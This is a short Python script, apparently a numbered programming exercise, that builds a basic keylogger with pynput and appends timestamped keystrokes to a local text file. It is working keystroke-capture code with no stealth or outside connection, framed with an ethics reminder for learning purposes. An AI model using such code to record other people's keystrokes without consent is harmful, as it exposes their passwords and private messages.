'''
Task # 04
Simple Keylogger
Create a basic keylogger program that records and logs keystrokes. 
Focus on logging the keys pressed and saving them to a file. 
Note: Ethical considerations and permissions are crucial for 
projects involving keyloggers.
If pynput is not installed install it using 
"pip install pynput".
'''


from pynput import keyboard
import time

def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logKey:
        try:
            timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
            logKey.write(f"{timestamp} - {key}\n")
        except:
            print("Error getting the Char")



if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()